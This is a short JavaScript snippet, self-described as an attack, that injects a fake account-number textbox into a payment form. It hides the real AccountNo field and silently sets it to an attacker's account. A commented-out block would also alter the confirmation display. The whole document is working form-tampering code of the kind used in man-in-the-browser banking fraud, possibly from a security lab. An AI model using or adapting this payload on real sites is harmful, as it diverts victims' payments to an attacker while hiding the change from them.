// This attack creates a fake textbox for user to type account number and hides the original one
var tbox = document.createElement("input");
tbox.setAttribute("type", "text");
tbox.setAttribute("value", "");
tbox.setAttribute("name", "FakeAccnumber");
tbox.setAttribute("size", "20");
var formvar = document.getElementById("formid");
var rbox = document.getElementById("AccountNo");
rbox.setAttribute("type","hidden");
rbox.setAttribute("value", "attackeraccount");
formvar.insertBefore(tbox,formvar.childNodes[3]);

// The following code changes the acccount umber from the original field on the fly when submit button is clicked
/*document.getElementById("SubmitButton").onclick = function attackerOnclick(){
	//var inp1 = document.getElementById("AccountNo").value;
	var inp2 = document.getElementById("Amount").value;
	document.getElementById("acno").innerHTML="attackeraccount";
	document.getElementById("amt").innerHTML=inp2;
	console.log("running");
}*/
